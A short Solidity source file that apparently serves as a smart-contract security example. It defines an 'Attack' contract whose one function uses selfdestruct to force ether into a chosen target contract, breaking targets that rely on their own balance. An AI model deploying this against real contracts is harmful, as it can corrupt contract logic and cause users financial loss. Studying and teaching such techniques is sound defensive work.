pragma solidity ^0.6.10;

contract Attack {
    // _addr is the contract that we want to attack (target)
    function attack(address payable _addr) public payable {
        selfdestruct(_addr);
    }
}
